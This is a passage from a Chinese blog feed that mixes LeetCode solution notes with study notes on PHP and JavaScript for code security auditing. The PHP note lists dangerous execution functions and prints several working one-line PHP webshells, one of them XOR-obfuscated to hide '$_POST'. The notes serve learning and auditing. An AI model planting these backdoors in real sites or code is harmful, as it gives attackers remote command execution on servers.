        <content type="html"><![CDATA[<h2 id="60、第k个排列"><a href="#60、第k个排列" class="headerlink" title="60、第k个排列"></a>60、第k个排列</h2><p><a href="https://leetcode-cn.com/problems/permutation-sequence/">https://leetcode-cn.com/problems/permutation-sequence/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aMZG9K"><img src="https://s1.ax1x.com/2020/07/30/aMZG9K.png" alt="aMZG9K.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>思路就是找规律，发现第n位的数字与n-1的全排列数有关系。下面的题解与我思路一致，但我没能将过程叙述出来，向大佬低头。</p><blockquote><p>假设n=5,k=35,<br>n为5的全排列就是首位为1-5的如下排列的所有<br>1_,,,2,,,3,,,4,,,5,,,每个各有24个排列，组成12345的全排列<br>由于k=35&lt;48,也就是说第35个肯定在首位为2的全排列里边,所以第一个取2。<br>接下来就是考虑剩下1345这四个数的全排列里边取第k=35-24=11个，<br>1,,3,,4,,5,,每个各有6个排列，组成1345的全排列，<br>由于k=11&lt;12,也就是说第11个肯定在首位为3的全排列里边，所以第二个数取3<br>接下来就是考虑剩下145这三个数的全排列里边取第k=11-6=5个，<br>1,4,5,_每个各有2个排列，组成145的全排列<br>由于k=5&lt;6,也就是说第5个肯定在首位为5的全排列里边，所以第三个数取5<br>接下来就是考虑剩下14这两个数的排列里边取第k=5-4=1个<br>1_4_每个各有1个排列，组成14的排列，<br>由于k=1,所以第四个数取1<br>最后加上剩下的最后一个4，结果就是23514<br>结束。</p><p>作者：xiao-xu-10<br>链接：<a href="https://leetcode-cn.com/problems/permutation-sequence/solution/zhe-ti-ru-guo-di-gui-jiu-zuo-fu-za-liao-qi-shi-shi/">https://leetcode-cn.com/problems/permutation-sequence/solution/zhe-ti-ru-guo-di-gui-jiu-zuo-fu-za-liao-qi-shi-shi/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPermutation</span>(<span class="params">self, n: int, k: int</span>) -&gt; str:</span></span><br><span class="line">        num = []</span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">            num.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            count = math.factorial(n - (i + <span class="number">1</span>))</span><br><span class="line">            index = (k - <span class="number">1</span>) // count</span><br><span class="line">            res += str(num[index])</span><br><span class="line">            num.remove(num[index])</span><br><span class="line">            k = k - count * index</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>56-合并区间</title>
      <link href="/2020/07/30/Leetcode/56%E3%80%81%E5%90%88%E5%B9%B6%E5%8C%BA%E9%97%B4/"/>
      <url>/2020/07/30/Leetcode/56%E3%80%81%E5%90%88%E5%B9%B6%E5%8C%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="56、合并区间"><a href="#56、合并区间" class="headerlink" title="56、合并区间"></a>56、合并区间</h2><p><a href="https://leetcode-cn.com/problems/merge-intervals/">https://leetcode-cn.com/problems/merge-intervals/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aKT17q"><img src="https://s1.ax1x.com/2020/07/30/aKT17q.png" alt="aKT17q.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题思路比较简单，先将所有区间升序排序，排序的依据是每一个区间的左区间元素。</p><p>排序过后，直接遍历判断即可，第一个区间直接加入res，之后每次都判断当前的区间左区间元素是否小于上一个区间的右区间元素；</p><p>如果是，则判断当前区间的右区间元素是否大于res最后一个区间的右区间元素，如果大于，就说明范围可合并，将res的最后一个区间的右区间元素换成当前区间的右区间元素。</p><p>否则，直接将当前区间加入res。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">self, intervals: List[List[int]]</span>) -&gt; List[List[int]]:</span></span><br><span class="line">        intervals.sort(key=<span class="keyword">lambda</span> num:num[<span class="number">0</span>])</span><br><span class="line">        res=[]</span><br><span class="line">        <span class="keyword">for</span> list <span class="keyword">in</span> intervals:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res <span class="keyword">or</span> res[<span class="number">-1</span>][<span class="number">1</span>] &lt; list[<span class="number">0</span>]:</span><br><span class="line">                res.append(list)</span><br><span class="line">            <span class="keyword">elif</span> res[<span class="number">-1</span>][<span class="number">1</span>] &lt; list[<span class="number">1</span>]:</span><br><span class="line">                res[<span class="number">-1</span>][<span class="number">1</span>] = list[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> res       </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、PHP</title>
      <link href="/2020/07/30/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/6%E3%80%81PHP/"/>
      <url>/2020/07/30/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/6%E3%80%81PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="一、PHP特点"><a href="#一、PHP特点" class="headerlink" title="一、PHP特点"></a>一、PHP特点</h3><p>1、可以与HTML混编，但脚本后缀名应为.php。</p><p>2、PHP注释不会在页面文档的源码中显示，而HTML页面的注释和JS的注释却可以在页面源码中显示。这是因为PHP的运行环境是服务器端，我们浏览器端获得的最终的页面内容是服务器端PHP的解释器对PHP代码处理完成后产生的结果。而HTML和JS的运行环境就是浏览器。这就是根本的区别。</p><p>3、PHP的语法错误等级有error、warning、notice，其中有语句出现error级别的错误直接会停止接下来的语句解释运行，而warning和notice只提示错误，仍然会继续解释执行接下来的语句。</p><h3 id="二、PHP基础"><a href="#二、PHP基础" class="headerlink" title="二、PHP基础"></a>二、PHP基础</h3><h4 id="1、PHP标签："><a href="#1、PHP标签：" class="headerlink" title="1、PHP标签："></a>1、PHP标签：</h4><p><code>&lt;?php 左边开始标记，右边结束标记 ?&gt;</code></p><h4 id="2、PHP变量"><a href="#2、PHP变量" class="headerlink" title="2、PHP变量"></a>2、PHP变量</h4><p><u>1）变量的声明</u>：<code>$变量名</code>第一次给变量赋值时才创建这个变量（像shell）</p><p><u>2）变量的释放</u>：<code>unset $变量名;</code> </p><p><u>3）变量命名规则</u>：严格区分大小写、字母数字下划线，不能以数字开头。</p><p><u>4）可变变量</u>：<code>$$变量名</code>，此变量的变量名跟随<code>$变量名</code>变化。</p><p><u>5）引用赋值</u>：<code>$b=&amp;$a</code>，使<code>$b</code>变量指向<code>$a</code>的内存空间，此时<code>$a</code>和<code>$b</code>指向了同一块内存空间。</p><p><u>6）变量的数据类型</u>：</p><blockquote><p>1、布尔类型bool(true、false)：false、0、0.0、””、”0”、[]、NULL这些值会被作为条件的false。<a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a></p><p>2、整型int；3、浮点数float；</p><p>4、字符串string：单引号、双引号定义都可，区别在于①字符串内容对单引号和双引号以及是否转义的使用②双引号定义的字符串中包含变量名时可以取变量值（最好把变量用{}括起来），单引号只可表面输出变量名。</p><p>​    比较特别的一种string定义方式——定界符定义：使用定界符定义一个字符串时，字符串的内容可以随意使用特殊符号，无需担心转移符号所带来的繁杂困扰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = &lt;&lt;&lt;大写字母开头的符号标识 </span><br><span class="line">......................</span><br><span class="line">大写字母开头的符号标识;</span><br><span class="line"><span class="comment">//注意定界符的格式特别严谨，结束符的行只能由符号标识和一个分号，其它什么元素都不能有</span></span><br></pre></td></tr></table></figure><p>5、数组；6、对象；</p><p>7、常量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常量的定义：define(<span class="string">&quot;常量名&quot;</span>,<span class="string">&quot;常量内容&quot;</span>);全局/整个脚本文件有效。</span><br><span class="line">预定义的常量：</span><br><span class="line"><span class="keyword">__FILE__</span>    当前文件的绝对路径/文件名</span><br><span class="line"><span class="keyword">__LINE__</span>    当前代码行数</span><br><span class="line"><span class="keyword">__FUNCTION__</span>    当前函数名</span><br><span class="line"><span class="keyword">__CLASS__</span>    当前的类名</span><br><span class="line"><span class="keyword">__METHOD__</span>    当前对象的方法名</span><br><span class="line"><span class="keyword">__DIR__</span>        当前工作目录</span><br><span class="line">PHP_OS    解释PHP脚本的操作系统环境</span><br><span class="line">PHP_VERSION    PHP版本</span><br><span class="line">DIRECTORY_SEPARATOR    操作系统文件分隔符 win\ linux/</span><br></pre></td></tr></table></figure></blockquote><p><u>7）变量的作用域</u>：</p><blockquote><p>三种类型变量：Local（局部 函数内定义）、Global（全局 函数外定义）、Static（静态 关键字定义）</p><p>当需要函数内使用全局变量时需要使用<code>global</code>关键字声明，也可使用<code>$GLOBALS[&#39;变量名&#39;]</code>访问。</p></blockquote><h4 id="3、PHP运算符"><a href="#3、PHP运算符" class="headerlink" title="3、PHP运算符"></a>3、PHP运算符</h4><p><u>1）算术运算符</u>：<code>a .= b/ a = a . b    #字符串的连接</code></p><p><u>2）比较运算符</u>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意在php中 6 == &quot;6&quot; 为true，“==”不在乎类型只在乎内容，&quot;===&quot;在乎类型。</span></span><br><span class="line">x === y <span class="comment">#绝对等于，内容和类型都相同</span></span><br><span class="line">x !== y    <span class="comment">#绝对不等于，内容或类型不同为true</span></span><br><span class="line">x != y / x &lt;&gt; y    <span class="comment">#不等于</span></span><br></pre></td></tr></table></figure><p><u>3）逻辑运算符</u>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>、<span class="keyword">or</span>、&amp;&amp;、||、!、<span class="keyword">xor</span>(异或)    <span class="comment">#逻辑运算符运算的值是true和false</span></span><br><span class="line"><span class="comment">## and 、 xor 、 or 的优先级小于“ = ”！</span></span><br></pre></td></tr></table></figure><p><u>4）数组运算符</u>：</p><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">x + y</td><td align="left">集合</td><td align="left">x 和 y 的集合</td></tr><tr><td align="left">x == y</td><td align="left">相等</td><td align="left">如果 x 和 y 具有相同的键/值对，则返回 true</td></tr><tr><td align="left">x === y</td><td align="left">恒等</td><td align="left">如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true</td></tr><tr><td align="left">x != y</td><td align="left">不相等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr><tr><td align="left">x &lt;&gt; y</td><td align="left">不相等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr><tr><td align="left">x !== y</td><td align="left">不恒等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr></tbody></table><p><u>5）组合比较符</u>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line">如果 $a &gt; $b, 则 $c 的值为 <span class="number">1</span>。</span><br><span class="line">如果 $a == $b, 则 $c 的值为 <span class="number">0</span>。</span><br><span class="line">如果 $a &lt; $b, 则 $c 的值为 <span class="number">-1</span>。</span><br></pre></td></tr></table></figure><p><u>6）shell命令执行符</u>：两个反引号`，页面返回执行结果</p><p><u>7）屏蔽warn、notice符</u>：<code>@</code>，在变量前加</p><h3 id="三、常见的PHP语句"><a href="#三、常见的PHP语句" class="headerlink" title="三、常见的PHP语句"></a>三、常见的PHP语句</h3><p>1、<code>phpinfo()</code></p><p>2、<code>echo</code>    #输出</p><p>3、<code>var_dump()</code>    #输出变量值以及变量内容</p><h3 id="四、PHP的流程控制"><a href="#四、PHP的流程控制" class="headerlink" title="四、PHP的流程控制"></a>四、PHP的流程控制</h3><p><a href="https://www.php.net/manual/zh/language.control-structures.php">https://www.php.net/manual/zh/language.control-structures.php</a></p><p>if、switch、while、do while、for和C语言相同; </p><p><u>特殊</u>：</p><p>1、<code>break n</code>跳出n层循环，比如for嵌套三个，在内层可以break 3，直接跳出结束3层循环。</p><p>2、<code>die()</code>、<code>exit()</code>结束脚本执行/PHP解释器进程。</p><h3 id="五、PHP函数"><a href="#五、PHP函数" class="headerlink" title="五、PHP函数"></a>五、PHP函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参数传递方式：</span></span><br><span class="line"><span class="comment">#1、值传递；2、引用传递&amp;；</span></span><br><span class="line"><span class="comment">#3、默认参数值：$参数名=默认值；</span></span><br><span class="line"><span class="comment">#4、可变参数列表：func_get_arg(偏移量)、func_get_args()、func_num_args()获取参数个数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">$参数名</span>)    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> $返回值变量;    <span class="comment">#如需返回值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">######## 可变函数调用 ########</span></span><br><span class="line">$variable = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">$variable(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="六、PHP数组"><a href="#六、PHP数组" class="headerlink" title="六、PHP数组"></a>六、PHP数组</h3><p>PHP的数组是一种可承载复合类型的数组，<u>可理解为一种随意的map。键值对类型随意，潇洒。</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下是菜鸟教程讲解，个人认为PHP的数组就是随意的Map，无数组类型之分。</span></span><br><span class="line"><span class="comment">###数值数组</span></span><br><span class="line">$数组名=<span class="keyword">array</span>(<span class="string">&quot;值&quot;</span>,<span class="string">&quot;值&quot;</span>);    <span class="comment">#创建数组方法1</span></span><br><span class="line">$数组名[n]=<span class="string">&quot;值&quot;</span>;    <span class="comment">#创建数组方法2</span></span><br><span class="line">$数组名[]=<span class="string">&quot;值&quot;</span>;    <span class="comment">#创建数组方法3，索引值自动设置为最小数字</span></span><br><span class="line">count($数组名);    <span class="comment">#获得数组长度</span></span><br><span class="line">print_r($数组名)、var_dump($数组名);    <span class="comment">#输出数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###关联数组（Map）</span></span><br><span class="line">$数组名=<span class="keyword">array</span>(<span class="string">&quot;键&quot;</span>=&gt;<span class="string">&quot;值&quot;</span>,<span class="string">&quot;键&quot;</span>=&gt;<span class="string">&quot;值&quot;</span>);    <span class="comment">#创建关联数组方法1</span></span><br><span class="line"><span class="keyword">foreach</span>($数组名 <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key:&quot;</span>.$key.<span class="string">&quot; value:&quot;</span>.$value.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">###多维数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###超全局预定义数组变量(函数内外都可以使用，无需声明)</span></span><br><span class="line">$GLOBALS    <span class="comment">#全局变量数组</span></span><br><span class="line">$_SERVER    <span class="comment">#包含服务器相关信息的数组</span></span><br><span class="line">$_GET        <span class="comment">#通过URL参数/GET方法传递给当前脚本的变量数组:url?arg1=v&amp;arg2=v</span></span><br><span class="line">$_POST        <span class="comment">#当HTTP POST请求报文中的属性Content-Type是application/x-www-form-urlencoded 或 multipart/form-data时，会将变量以关联数组形式传入脚本</span></span><br><span class="line">$_FILES        <span class="comment">#文件上传信息的关联数组</span></span><br><span class="line">$_COOKIE    <span class="comment">#客户端传送的Cookie信息</span></span><br><span class="line">$_SESSION    <span class="comment">#客户端的会话数据</span></span><br></pre></td></tr></table></figure><h3 id="七、PHP危险函数"><a href="#七、PHP危险函数" class="headerlink" title="七、PHP危险函数"></a>七、PHP危险函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($POST[<span class="string">&#x27;1&#x27;</span>])    <span class="comment">#将字符串作为PHP代码执行</span></span><br><span class="line">assert($字符串变量)    <span class="comment">#将字符串作为PHP代码执行</span></span><br><span class="line">$h = create_function(<span class="string">&#x27;$i&#x27;</span>, <span class="string">&#x27;return system($i);&#x27;</span>);    $h(<span class="string">&#x27;ipconfig&#x27;</span>);<span class="comment">#匿名函数</span></span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;shell命令&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;shell命令&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="八、验证登录表单-文件上传实例"><a href="#八、验证登录表单-文件上传实例" class="headerlink" title="八、验证登录表单/文件上传实例"></a>八、验证登录表单/文件上传实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>($变量名)    <span class="comment">#验证变量是否被定义过</span></span><br><span class="line"><span class="keyword">empty</span>($变量名)    <span class="comment">#判断变量内容是否为空，即使变量未被定义</span></span><br><span class="line">move_uploaded_file(被移动文件,路径/目标文件);    <span class="comment">#返回true/false，复制上传的文件的某个位置</span></span><br></pre></td></tr></table></figure><h3 id="九、一句话后门"><a href="#九、一句话后门" class="headerlink" title="九、一句话后门"></a>九、一句话后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_GET[<span class="string">&#x27;a&#x27;</span>]($_GET[<span class="string">&#x27;b&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>55-跳跃游戏</title>
      <link href="/2020/07/29/Leetcode/55%E3%80%81%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8F/"/>
      <url>/2020/07/29/Leetcode/55%E3%80%81%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="55、跳跃游戏"><a href="#55、跳跃游戏" class="headerlink" title="55、跳跃游戏"></a>55、跳跃游戏</h2><p><a href="https://leetcode-cn.com/problems/jump-game/">https://leetcode-cn.com/problems/jump-game/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/amr5qA"><img src="https://s1.ax1x.com/2020/07/29/amr5qA.png" alt="amr5qA.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>给大佬跪了，如此简洁的解法！</p><blockquote><p><strong>解题思路：</strong><br>如果某一个作为 <strong>起跳点</strong> 的格子可以跳跃的距离是 3，那么表示后面 3 个格子都可以作为 <strong>起跳点</strong>。<br>可以对每一个能作为 <strong>起跳点</strong> 的格子都尝试跳一次，把 <strong>能跳到最远的距离</strong> 不断更新。<br>如果可以一直跳到最后，就成功了。</p><p>作者：ikaruga<br>链接：<a href="https://leetcode-cn.com/problems/jump-game/solution/55-by-ikaruga/">https://leetcode-cn.com/problems/jump-game/solution/55-by-ikaruga/</a></p></blockquote><p>此题解法总结起来就两个判断：</p><p>1、判断当前位置是否可达（也就是比较之前获得的最远可达位置是否大于当前位置），如果不可达说明已经走到头了，失败！</p><p>2、判断当前位置可达的最远位置是否大于上个位置获得的可达最远位置（刷新当前最远可达位置），如果大于那就说明我们的可达最远位置该更新了！</p><p>最后，顺利的走到了终点，跳出循环，奥力给。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canJump</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max_location = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> cur_location = <span class="number">0</span>; cur_location &lt; nums.<span class="built_in">size</span>(); cur_location++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur_location &gt; max_location) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            max_location = <span class="built_in">max</span>(max_location, cur_location + nums[cur_location]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5、Javascript</title>
      <link href="/2020/07/29/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/5%E3%80%81Javascript/"/>
      <url>/2020/07/29/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/5%E3%80%81Javascript/</url>
      
        <content type="html"><![CDATA[<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023020745357888">https://www.liaoxuefeng.com/wiki/1022910821149312/1023020745357888</a></p><h3 id="一、常用语句"><a href="#一、常用语句" class="headerlink" title="一、常用语句"></a>一、常用语句</h3><p><code>alert();/confirm();/prompt();</code>    #弹窗</p><p><code>console.log();</code>    #在控制台输出</p><h3 id="二、JS的版本标准与解释引擎"><a href="#二、JS的版本标准与解释引擎" class="headerlink" title="二、JS的版本标准与解释引擎"></a>二、JS的版本标准与解释引擎</h3><blockquote><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023022129105888">https://www.liaoxuefeng.com/wiki/1022910821149312/1023022129105888</a></p></blockquote><p>JavaScript标准是ECMAScript（目前已经是ES6），讲到JavaScipt的版本，实际上就是实现ES的哪个版本的标准。</p><p>google：V8引擎</p><p>firefox：OdinMonkey引擎</p><h3 id="三、如何在HTML中引入JS代码"><a href="#三、如何在HTML中引入JS代码" class="headerlink" title="三、如何在HTML中引入JS代码"></a>三、如何在HTML中引入JS代码</h3><p>1、内部<code>&lt;script&gt;&lt;/script&gt;标签</code>：JavaScript代码可以直接嵌在网页的任何地方，不过通常我们都把JavaScript代码放到在<code>&lt;head&gt;&lt;/head&gt;</code>中定义。</p><p>2、外部<code>&lt;script src=&quot;&quot;&gt;&lt;/script&gt;标签</code>：以.js文件形式在外部定义。</p><h3 id="四、JS代码建议部署位置"><a href="#四、JS代码建议部署位置" class="headerlink" title="四、JS代码建议部署位置"></a>四、JS代码建议部署位置</h3><p>由于浏览器从上至下解析代码，如果把JS放在上面，则如果需要对DOM进行操作就有可能没有解析出来，因此JS代码建议放在尾部去执行。</p><h3 id="五、JS基本语法"><a href="#五、JS基本语法" class="headerlink" title="五、JS基本语法"></a>五、JS基本语法</h3><h4 id="1、变量"><a href="#1、变量" class="headerlink" title="1、变量"></a>1、变量</h4><p>声明变量：<code>var</code></p><h4 id="2、数据类型"><a href="#2、数据类型" class="headerlink" title="2、数据类型"></a>2、数据类型</h4><p>JS支持数字(NaN无法计算、Infinity超过数字表示范围)、</p><p>字符串(建议单引号)、</p><p>布尔(true/false)、</p><p>数组([可混合类型])、</p><p>对象（var object = { key: value};）、</p><p>Map( var x = new Map(); x.set(‘key’,value); x.get；x.delete；x.has )、</p><p>Set(add、delete)、</p><blockquote><p><code>Map</code>和<code>Set</code>是ES6标准新增的数据类型，请根据浏览器的支持情况决定是否要使用。</p></blockquote><p>null/undefined等数据类型。统一通过给var赋值定义。</p><h3 id="六、流程控制"><a href="#六、流程控制" class="headerlink" title="六、流程控制"></a>六、流程控制</h3><blockquote><p>if、for、while、do while和C语言一样；</p></blockquote><p>1、for .. in：通过for in 可以遍历获得对象中的键，得到了键自然也能得到值，所以for..in主要是用于遍历对象中的键与值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> object) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、函数"><a href="#七、函数" class="headerlink" title="七、函数"></a>七、函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 